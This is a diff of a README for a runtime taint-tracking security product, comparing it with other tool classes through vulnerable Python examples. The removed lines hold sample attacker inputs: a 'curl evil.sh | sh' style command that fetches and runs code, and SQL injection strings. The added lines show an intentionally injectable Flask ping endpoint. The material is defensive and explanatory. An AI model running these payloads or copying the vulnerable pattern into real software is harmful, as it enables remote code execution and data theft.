@@ -83,129 +83,31 @@ You have limited hours for triage, so every event has to earn its place:
 - **A detection means the data actually arrived.** Not that a code path exists,
   and not that a pattern matched.
 
-## What EyalSec adds to the tools you run
+## A remote code execution (RCE) bug, and what each tool does about it
 
-Static analysis reads every path before release, a WAF stops known-bad traffic
-at the edge, an EDR watches the host. Each does its job, and you should keep
-them. EyalSec adds the one view none of them is placed to have: it follows
-untrusted data through the running program to the dangerous call, on whatever
-code path runs. One Python example per tool class is under the table.
-
-| Category | It does well | Outside its view | EyalSec adds |
-|----------|--------------|------------------|--------------|
-| **RASP** | Hooks the app while it serves a web request | Work that never enters an HTTP request, such as a queue worker | Marks untrusted data wherever it arrives, request or not |
-| **WAF / edge** | Pattern-matches malicious HTTP at the network boundary | Injection that never rides HTTP, a file or queue feed | Taints *every* input channel, not just the HTTP edge |
-| **SAST** | Statically scans source for risky patterns | Which flagged path is *really* exploitable | Fires only when live taint hits a sink |
-| **DAST / fuzzing** | Probes a running app from outside / fuzzes inputs | Injection that returns normally and never crashes | Flags the injection itself, crash or no crash |
-| **SCA / dependency** | Flags known-CVE dependencies | Unknown vulns; whether the CVE is truly hit | Confirms attacker data reaches the CVE |
-| **Sandboxing / isolation** | Restricts syscalls / isolates the process | App-level injection (sees only syscalls) | Tracks app-level taint to the sink |
-| **EDR / runtime threat** | Detects malicious behavior at the OS/host level | The exploit *before* it fires | Flags tainted data before the call |
-
-<details>
-<summary>One Python example per tool class</summary>
-
-### RASP
-
-A background worker takes its jobs off a message broker, not out of an HTTP
-request:
+Each of the tools you run does its own job, and you should keep them. Here is
+one bug, and what each kind of tool does about it:
 
 ```python
-job = sock.recv(4096).decode()      # broker message -> tainted; no HTTP request involved
-# attacker queued:  acme; curl evil.sh | sh
-subprocess.run(f"/usr/bin/invoice --customer {job}", shell=True)   # SINK -> es-python raises
+TOOLS = {"local": os.system,
+         "remote": ssh_run}
+
+@app.route("/check")
+def check():
+    host = request.args["host"]          # from the internet
+    run = TOOLS[request.args["via"]]     # picked at runtime
+    run("ping -c 1 " + host)             # RCE: host runs as a command
 ```
 
-**Added to RASP:** RASP agents are built around the HTTP request lifecycle:
-they inspect the request and what the app does while serving it. A worker that
-pulls jobs off a broker never enters a request, so there is nothing for the
-agent to inspect. es-python marks the bytes where they arrive, whichever
-protocol carried them, and follows them to the sink.
-
-### WAF / edge
-
-A CSV dropped by an SFTP partner feed never crosses the edge:
-
-```python
-row = open("/inbox/orders.csv").readline()   # file bytes -> tainted; the WAF never saw them
-# attacker planted a row:  '; DROP TABLE users; --
-db.execute("SELECT * FROM t WHERE id='" + row + "'")   # SINK -> es-python raises
-```
-
-**Added to WAF / edge:** the record arrives as a file from a batch drop, never
-over HTTP, so the edge has no packet to inspect. es-python taints every input
-channel, files included, so the bytes stay marked all the way to the SQL sink.
-
-### SAST
-
-The sink is chosen by a runtime key, so static dataflow loses it:
-
-```python
-ACTIONS = {"copy": shutil.copy, "run": os.system, "stat": os.stat}
-name, arg = sock.recv(4096).decode().split(":", 1)   # socket -> tainted
-# attacker sends:  run:reboot; curl evil | sh
-ACTIONS[name](arg)         # callable resolved at runtime -> SINK -> es-python raises
-```
-
-**Added to SAST:** which callable `ACTIONS[name]` resolves to is a runtime
-value, outside what a static engine can prove about the tainted `arg`.
-es-python sees the *actual* call.
-
-### DAST / fuzzing
-
-A successful SQL injection that never crashes:
-
-```python
-expr = sock.recv(4096).decode()   # socket -> tainted
-# expr = 1=1 UNION SELECT password FROM admins
-db.execute("SELECT * FROM logs WHERE " + expr)   # returns rows, exits 0 -> SINK
-```
-
-**Added to DAST / fuzzing:** the query runs cleanly and returns rows, so a
-coverage fuzzer rightly records a "pass". es-python flags the
-injection semantically, no crash required.
-
-### SCA / dependency
-
-Your own deserialization bug, which no third-party advisory describes:
-
-```python
-cookie = sock.recv(4096)   # cookie arrives over the wire -> tainted
-pickle.loads(cookie)   # SINK -> es-python raises
-```
-
-**Added to SCA / dependency:** SCA matches your lockfile against a CVE
-database. A flow in first-party code is in no advisory feed, so it has nothing
-to match. es-python reports the live tainted-bytes to `pickle.loads` flow.
-
-### Sandboxing / isolation
-
-The sandbox must permit `execve` for the legitimate dump, which lets the injected
-command through too:
-
-```python
-subprocess.run(["/usr/bin/pg_dump", "mydb"])       # legitimate, must be allowed
-name = sock.recv(4096).decode()   # socket -> tainted
-subprocess.run("tar czf /tmp/" + name + ".tgz /data", shell=True)   # SINK
-```
-
-**Added to sandboxing / isolation:** seccomp/gVisor decide per syscall; to allow
-`pg_dump` they must permit `execve`, which lets the injected `tar; ...` through
-too. es-python gates only the *tainted* exec and leaves the clean one alone.
-
-### EDR / runtime threat
-
-es-python raises before any payload executes:
-
-```python
-blob = sock.recv(65536)    # socket -> tainted
-pickle.loads(blob)  # SINK -> raises before the gadget detonates
-```
-
-**Added to EDR / runtime threat:** EDR detects malicious *behavior* once it
-shows, a spawned shell or a beacon. es-python raises *before* the pickle
-gadget runs: two moments of the same attack.
-
-</details>
+| Category | What it does | Still an RCE | Protected by EyalSec |
+|----------|--------------|--------------|----------------------|
+| **Sandboxing / isolation** | Limits what the process can reach. | The attacker can escalate, change the site and attack visitors. | It catches the command before it runs. |
+| **WAF / edge** | Blocks odd-looking strings in requests. | The attack can look like normal input, so it passes. | It judges where the text lands, not how it looks. |
+| **EDR / runtime threat** | Watches processes on the host. | It sees a shell start, not that a web request built it. | It stops the command and names the request and the line. |
+| **RASP** | Hooks risky calls inside the app. | It cannot tell which data reached the call, so no alert. | It follows the request text to the command and stops it. |
+| **SAST** | Scans source for known patterns. | Its simple patterns are rare in real code, and `run(...)` is not one. | It sees the real call to `os.system` and stops it. |
+| **DAST / fuzzing** | Sends odd inputs, waits for a crash. | The command runs, nothing crashes, nothing is reported. | It stops the request that tried it, and reports it. |
+| **SCA / dependency** | Lists libraries with known CVEs. | The bug is your own code, so no CVE names it. | It catches the bug in your own code. |
 
 ## The same idea in the browser: es-chromium
 
